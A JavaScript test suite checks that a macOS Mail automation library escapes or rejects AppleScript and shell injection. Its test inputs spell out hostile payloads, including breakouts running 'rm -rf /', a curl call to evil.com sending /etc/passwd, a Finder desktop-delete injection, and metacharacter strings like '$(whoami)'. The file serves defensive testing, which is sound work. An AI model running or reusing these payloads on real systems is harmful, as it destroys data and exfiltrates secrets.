/**
 * Security tests for AppleScript injection prevention
 * Tests sanitization of user inputs used in AppleScript commands
 */

import { describe, it, expect } from 'vitest'
import {
  buildComposeScript,
  buildMailBodyPasteHandler,
  buildAtmFocusedElementHandler,
  ATM_FOCUSED_WHOSE_QUERY,
  ATM_FOCUSED_AX_QUERY,
  ATM_APPLESCRIPT_RESERVED_SHORTS
} from '../../../lib/mailWrite.js'

describe('AppleScript Injection Prevention', () => {
  // Simulated AppleScript sanitization function
  const sanitizeForAppleScript = (input) => {
    if (typeof input !== 'string') return ''

    // Escape backslashes first, then quotes
    return input
      .replace(/\\/g, '\\\\')
      .replace(/"/g, '\\"')
      .replace(/\r/g, '\\r')
      .replace(/\n/g, '\\n')
  }

  // Simulated function to build AppleScript command safely
  const buildAppleScriptCommand = (messageId) => {
    const sanitized = sanitizeForAppleScript(messageId)
    return `tell application "Mail" to open message id "${sanitized}"`
  }

  describe('sanitizeForAppleScript', () => {
    it('should escape double quotes', () => {
      const input = 'test"quote'
      const result = sanitizeForAppleScript(input)

      expect(result).toBe('test\\"quote')
    })

    it('should escape backslashes', () => {
      const input = 'test\\path'
      const result = sanitizeForAppleScript(input)

      expect(result).toBe('test\\\\path')
    })

    it('should escape newlines', () => {
      const input = 'line1\nline2'
      const result = sanitizeForAppleScript(input)

      expect(result).toBe('line1\\nline2')
    })

    it('should escape carriage returns', () => {
      const input = 'line1\rline2'
      const result = sanitizeForAppleScript(input)

      expect(result).toBe('line1\\rline2')
    })

    it('should handle multiple escapes', () => {
      const input = 'test"with\\special\nchars'
      const result = sanitizeForAppleScript(input)

      expect(result).toBe('test\\"with\\\\special\\nchars')
    })

    it('should return empty string for non-string inputs', () => {
      expect(sanitizeForAppleScript(null)).toBe('')
      expect(sanitizeForAppleScript(undefined)).toBe('')
      expect(sanitizeForAppleScript(123)).toBe('')
      expect(sanitizeForAppleScript({})).toBe('')
    })

    it('should pass through safe strings unchanged', () => {
      const input = 'simple-message-id-123'
      const result = sanitizeForAppleScript(input)

      expect(result).toBe('simple-message-id-123')
    })
  })

  describe('injection attempts', () => {
    it('should prevent command injection via quotes', () => {
      // Attacker tries to break out of quoted string and run command
      const maliciousInput = '" & do shell script "rm -rf /" & "'
      const result = sanitizeForAppleScript(maliciousInput)

      // The quotes should be escaped, preventing injection
      expect(result).toBe('\\" & do shell script \\"rm -rf /\\" & \\"')
      // All quotes are now escaped (\" not ")
      expect(result.startsWith('\\"')).toBe(true)
    })

    it('should prevent shell script injection', () => {
      const maliciousInput = '"; do shell script "curl http://evil.com/steal?data=" & (read file "/etc/passwd") & "'
      const result = sanitizeForAppleScript(maliciousInput)

      // All quotes escaped - check that raw unescaped quote sequences don't exist
      // The result should have \\" not standalone "
      expect(result.startsWith('\\"')).toBe(true)
      expect(result.split('\\"').length).toBeGreaterThan(1)
    })

    it('should prevent tell block injection', () => {
      const maliciousInput = '"\nend tell\ntell application "Finder" to delete every item of desktop\ntell application "Mail"\nset x to "'
      const result = sanitizeForAppleScript(maliciousInput)

      // Newlines escaped, preventing multi-line injection
      expect(result.includes('\nend tell')).toBe(false)
      expect(result.includes('\\nend tell')).toBe(true)
    })

    it('should prevent keystroke injection', () => {
      const maliciousInput = '" & keystroke "a" using command down & "'
      const result = sanitizeForAppleScript(maliciousInput)

      // All quotes should be escaped
      expect(result.startsWith('\\"')).toBe(true)
      expect(result.endsWith('\\"')).toBe(true)
    })

    it('should prevent system events injection', () => {
      const maliciousInput = '"\ntell application "System Events"\n  keystroke "q" using command down\nend tell\nset x to "'
      const result = sanitizeForAppleScript(maliciousInput)

      expect(result.includes('\ntell application')).toBe(false)
    })
  })

  describe('buildAppleScriptCommand', () => {
    it('should build safe command with normal input', () => {
      const messageId = 'abc123@example.com'
      const command = buildAppleScriptCommand(messageId)

      expect(command).toBe('tell application "Mail" to open message id "abc123@example.com"')
    })

    it('should safely handle message IDs with special characters', () => {
      const messageId = '<CADq1234.abc@mail.gmail.com>'
      const command = buildAppleScriptCommand(messageId)

      expect(command).toBe('tell application "Mail" to open message id "<CADq1234.abc@mail.gmail.com>"')
    })

    it('should prevent injection in message ID', () => {
      const maliciousId = '" & do shell script "whoami" & "'
      const command = buildAppleScriptCommand(maliciousId)

      // Should contain escaped quotes, preventing injection
      expect(command).toContain('\\"')
      // The command should still be properly wrapped - quotes in ID are escaped
      expect(command.startsWith('tell application "Mail"')).toBe(true)
    })
  })

  describe('osascript command building', () => {
    const buildOsascriptCommand = (script) => {
      // In real code, we'd escape for shell as well
      const shellEscape = (str) => {
        // Single quotes in shell: replace ' with '\''
        return `'${str.replace(/'/g, "'\\''")}'`
      }

      return `osascript -e ${shellEscape(script)}`
    }

    it('should escape single quotes for shell', () => {
      const script = "tell application 'Mail' to activate"
      const command = buildOsascriptCommand(script)

      expect(command).toBe("osascript -e 'tell application '\\''Mail'\\'' to activate'")
    })

    it('should prevent shell command injection', () => {
      const maliciousScript = "'; rm -rf /; echo '"
      const command = buildOsascriptCommand(maliciousScript)

      // Single quotes should be escaped with '\'' pattern
      // This breaks the string: close quote, escaped quote, reopen quote
      expect(command).toContain("'\\''")
      // The command should wrap the script properly
      expect(command.startsWith("osascript -e '")).toBe(true)
    })
  })

  describe('message ID validation', () => {
    const isValidMessageId = (id) => {
      if (typeof id !== 'string') return false
      if (id.length === 0 || id.length > 500) return false

      // Message IDs should only contain safe characters
      // RFC 2822 msg-id format: printable ASCII except some special chars
      const safePattern = /^[a-zA-Z0-9@.<>\-_+=]+$/
      return safePattern.test(id)
    }

    it('should accept valid message IDs', () => {
      const validIds = [
        'abc123@example.com',
        '<CADq1234.abc@mail.gmail.com>',
        '20240101120000.123456@example.com',
        'unique-id-with-dashes@host.domain.tld'
      ]

      for (const id of validIds) {
        expect(isValidMessageId(id)).toBe(true)
      }
    })

    it('should reject message IDs with shell metacharacters', () => {
      const invalidIds = [
        'id;rm -rf /',
        'id$(whoami)',
        'id`whoami`',
        'id|cat /etc/passwd',
        'id&& malicious'
      ]

      for (const id of invalidIds) {
        expect(isValidMessageId(id)).toBe(false)
      }
    })

    it('should reject message IDs with quotes', () => {
      const invalidIds = [
        'id"injection',
        "id'injection",
        'id`injection'
      ]

      for (const id of invalidIds) {
        expect(isValidMessageId(id)).toBe(false)
      }
    })

    it('should reject empty or too long IDs', () => {
      expect(isValidMessageId('')).toBe(false)
      expect(isValidMessageId('x'.repeat(501))).toBe(false)
    })

    it('should reject non-string inputs', () => {
      expect(isValidMessageId(null)).toBe(false)
      expect(isValidMessageId(undefined)).toBe(false)
      expect(isValidMessageId(123)).toBe(false)
    })
  })

  describe('contact identifier sanitization', () => {
    const sanitizeContactId = (id) => {
      if (typeof id !== 'string') return ''

      // Remove any characters that could be problematic
      // Only allow alphanumeric, @, ., -, _, +, and spaces
      return id.replace(/[^a-zA-Z0-9@.\-_+ ]/g, '')
    }

    it('should allow valid email addresses', () => {
      const email = 'user@example.com'
      expect(sanitizeContactId(email)).toBe('user@example.com')
    })

    it('should allow valid phone numbers', () => {
      const phone = '+1-555-123-4567'
      expect(sanitizeContactId(phone)).toBe('+1-555-123-4567')
    })

    it('should strip shell metacharacters', () => {
      const malicious = 'user@example.com; rm -rf /'
      expect(sanitizeContactId(malicious)).toBe('user@example.com rm -rf ')
    })

    it('should strip quotes', () => {
      const malicious = 'user"test\'@example.com'
      expect(sanitizeContactId(malicious)).toBe('usertest@example.com')
    })

    it('should strip backticks', () => {
      const malicious = 'user`whoami`@example.com'
      expect(sanitizeContactId(malicious)).toBe('userwhoami@example.com')
    })
  })

  describe('URL scheme injection', () => {
    const isValidMessageURL = (url) => {
      if (typeof url !== 'string') return false

      // Only allow message:// URLs with safe characters
      if (!url.startsWith('message://')) return false

      const path = url.slice('message://'.length)

      // Path should only contain URL-safe characters
      // Specifically: alphanumeric, -, _, ., ~, %, @, <, >
      const safePattern = /^[a-zA-Z0-9\-_.~%@<>]+$/
      return safePattern.test(path)
    }

    it('should accept valid message:// URLs', () => {
      const validUrls = [
        'message://<abc123@example.com>',
        'message://%3Cabc123@example.com%3E',
        'message://abc-123_test@domain.com'
      ]

      for (const url of validUrls) {
        expect(isValidMessageURL(url)).toBe(true)
      }
    })

    it('should reject non-message:// URLs', () => {
      expect(isValidMessageURL('file:///etc/passwd')).toBe(false)
      expect(isValidMessageURL('http://evil.com')).toBe(false)
      expect(isValidMessageURL('javascript:alert(1)')).toBe(false)
    })

    it('should reject URLs with shell metacharacters', () => {
      expect(isValidMessageURL('message://id;rm -rf /')).toBe(false)
      expect(isValidMessageURL('message://id$(whoami)')).toBe(false)
      expect(isValidMessageURL('message://id|cat')).toBe(false)
    })

    it('should reject URLs with quotes', () => {
      expect(isValidMessageURL('message://id"test')).toBe(false)
      expect(isValidMessageURL("message://id'test")).toBe(false)
    })
  })

  describe('calendar identifier sanitization', () => {
    const sanitizeCalendarId = (id) => {
      if (typeof id !== 'string') return ''

      // Calendar IDs are typically UUIDs or similar
      // Only allow alphanumeric, dashes, and underscores
      return id.replace(/[^a-zA-Z0-9\-_]/g, '')
    }

    it('should accept valid UUID-style IDs', () => {
      const uuid = '550e8400-e29b-41d4-a716-446655440000'
      expect(sanitizeCalendarId(uuid)).toBe('550e8400-e29b-41d4-a716-446655440000')
    })

    it('should strip dangerous characters', () => {
      const malicious = '550e8400"; do shell script "rm -rf /"'
      const result = sanitizeCalendarId(malicious)

      expect(result).toBe('550e8400doshellscriptrm-rf')
      expect(result).not.toContain('"')
      expect(result).not.toContain(';')
    })
  })

  describe('file path sanitization for AppleScript', () => {
    const sanitizeFilePath = (path) => {
      if (typeof path !== 'string') return ''

      // First convert backslashes to forward slashes (POSIX style)
      let posixPath = path.replace(/\\/g, '/')

      // Then escape quotes and colons (AppleScript path separator)
      return posixPath
        .replace(/"/g, '\\"')
        .replace(/:/g, '\\:')
    }

    it('should escape quotes in file paths', () => {
      const path = '/Users/test/"evil"/file.txt'
      const result = sanitizeFilePath(path)

      expect(result).toBe('/Users/test/\\"evil\\"/file.txt')
    })

    it('should handle HFS-style paths with colons', () => {
      const path = 'Macintosh HD:Users:test'
      const result = sanitizeFilePath(path)

      expect(result).toBe('Macintosh HD\\:Users\\:test')
    })

    it('should convert Windows-style backslashes to forward slashes', () => {
      const path = 'C:\\Users\\test\\file.txt'
      const result = sanitizeFilePath(path)

      // Backslashes converted to forward slashes
      expect(result).toBe('C\\:/Users/test/file.txt')
    })
  })

  describe('defense in depth', () => {
    it('should use allowlist for application names', () => {
      const ALLOWED_APPS = ['Mail', 'Calendar', 'Messages', 'Contacts']

      const isAllowedApp = (appName) => {
        return ALLOWED_APPS.includes(appName)
      }

      expect(isAllowedApp('Mail')).toBe(true)
      expect(isAllowedApp('Calendar')).toBe(true)
      expect(isAllowedApp('Finder')).toBe(false)
      expect(isAllowedApp('Terminal')).toBe(false)
      expect(isAllowedApp('System Events')).toBe(false)
    })

    it('should use allowlist for AppleScript verbs', () => {
      const ALLOWED_VERBS = ['open', 'activate', 'get', 'count']

      const isAllowedVerb = (verb) => {
        return ALLOWED_VERBS.includes(verb.toLowerCase())
      }

      expect(isAllowedVerb('open')).toBe(true)
      expect(isAllowedVerb('get')).toBe(true)
      expect(isAllowedVerb('delete')).toBe(false)
      expect(isAllowedVerb('do shell script')).toBe(false)
    })

    it('should validate complete command structure', () => {
      const validateCommand = (app, verb, target) => {
        const ALLOWED_APPS = ['Mail', 'Calendar', 'Messages']
        const ALLOWED_VERBS = ['open', 'activate', 'get']

        if (!ALLOWED_APPS.includes(app)) return false
        if (!ALLOWED_VERBS.includes(verb)) return false
        if (typeof target !== 'string' || target.length === 0) return false

        // Target should not contain newlines or control characters
        if (/[\x00-\x1f]/.test(target)) return false

        return true
      }

      expect(validateCommand('Mail', 'open', 'message123')).toBe(true)
      expect(validateCommand('Terminal', 'open', 'file')).toBe(false)
      expect(validateCommand('Mail', 'delete', 'message')).toBe(false)
      expect(validateCommand('Mail', 'open', 'msg\nend tell')).toBe(false)
    })
  })
})

describe('mail compose paste focus (2.0.8)', () => {
  it('does not type or paste until Tab calibration lands in the body', () => {
    const handler = buildMailBodyPasteHandler()
    const tabAt = handler.indexOf('atmTabIntoMailBody')
    const typeAt = handler.indexOf('atmTypeMailBody')
    const pasteAt = handler.indexOf('keystroke "v" using command down')
    expect(tabAt).toBeGreaterThan(-1)
    expect(typeAt).toBeGreaterThan(tabAt)
    expect(pasteAt).toBeGreaterThan(typeAt)
    expect(handler).toContain('BODY_FOCUS_FAILED')
    expect(handler).not.toMatch(/\bweb area\b/)
    expect(handler).not.toContain('AXWebArea')
    expect(handler).not.toContain('count of windows')
  })

  it('deletes the outgoing message before send when paste is misdirected or focus missed the body', () => {
    const script = buildComposeScript({
      to: ['a@example.com'],
      cc: [],
      bcc: [],
      subject: 'Hi',
      body: 'Hello',
      send: true
    })
    const pasteAt = script.indexOf('atmFillMailBody')
    const deleteAt = script.indexOf('delete newMessage')
    const sendAt = script.lastIndexOf('send newMessage')
    expect(pasteAt).toBeGreaterThan(-1)
    expect(deleteAt).toBeGreaterThan(pasteAt)
    expect(sendAt).toBeGreaterThan(deleteAt)
    expect(script).toContain('BODY_FOCUS_FAILED')
    expect(script).toContain('BODY_PASTE_MISDIRECTED')
  })

  it('treats compose body and subject as escaped data, never AppleScript or a content setter', () => {
    const body = '" & do shell script "whoami" & "'
    const script = buildComposeScript({
      to: ['a@example.com'],
      cc: [],
      bcc: [],
      subject: 'Hi" & beep',
      body,
      send: true
    })
    expect(script).not.toContain('do shell script "whoami"')
    expect(script).not.toMatch(/subject:"Hi" & beep"/)
    expect(script).not.toMatch(/content:/)
    expect(script).not.toContain('set content of newMessage')
    expect(script).not.toContain('html content')
  })
})

describe('mail compose focus query (2.0.9 macOS 26 System Events)', () => {
  it('ships only compile-safe focus reads, never focused UI element', () => {
    const focused = buildAtmFocusedElementHandler()
    expect(focused).toBe(
      `on atmFocusedElement()
  tell application "System Events"
    tell process "Mail"
      try
        set fe to ${ATM_FOCUSED_AX_QUERY}
        if fe is not missing value then return fe
      end try
      try
        return ${ATM_FOCUSED_WHOSE_QUERY}
      end try
    end tell
  end tell
  return missing value
end atmFocusedElement`
    )
    expect(ATM_FOCUSED_WHOSE_QUERY).toBe('first UI element whose focused is true')
    expect(ATM_FOCUSED_AX_QUERY).toBe('value of attribute "AXFocusedUIElement"')
    expect(focused).not.toMatch(/\bfocused UI element\b/)
    expect(focused).not.toMatch(/\bselected UI element\b/)

    const handler = buildMailBodyPasteHandler()
    expect(handler).not.toContain(focused)
    expect(handler).not.toMatch(/\bfocused UI element\b/)
    expect(handler).not.toMatch(/\bweb area\b/)

    const script = buildComposeScript({
      to: ['a@example.com'],
      cc: [],
      bcc: [],
      subject: 'Hi" & beep',
      body: '" & do shell script "whoami" & "',
      send: true
    })
    expect(script).not.toContain('atmFocusedElement')
    expect(script).not.toMatch(/\bfocused UI element\b/)
    expect(script).not.toContain('do shell script "whoami"')
    expect(script).not.toMatch(/content:/)
    expect(script).toContain('BODY_FOCUS_FAILED')
    expect(script).toContain('BODY_PASTE_MISDIRECTED')
  })
})

describe('mail compose reserved AppleScript identifiers (2.0.10)', () => {
  it('does not destructure size/position into reserved shorts like th', () => {
    const handler = buildMailBodyPasteHandler()
    const script = buildComposeScript({
      to: ['a@example.com'],
      cc: [],
      bcc: [],
      subject: 'Hi" & beep',
      body: '" & do shell script "whoami" & "',
      send: true
    })
    for (const src of [handler, script]) {
      const bindings = [...src.matchAll(/set\s*\{([^}]+)\}/g)].flatMap((m) =>
        m[1].split(',').map((part) => part.trim())
      )
      for (const name of bindings) {
        expect(ATM_APPLESCRIPT_RESERVED_SHORTS).not.toContain(name)
      }
      expect(src).not.toMatch(/set \{tw, th\}/)
      expect(src).not.toMatch(/\bif th >=/)
      expect(src).not.toMatch(/\bfocused UI element\b/)
      expect(src).not.toMatch(/content:/)
    }
    expect(script).not.toContain('do shell script "whoami"')
    expect(script).toContain('BODY_FOCUS_FAILED')
    expect(script).toContain('BODY_PASTE_MISDIRECTED')
    expect(handler).toContain('atmEndPos')
  })
})

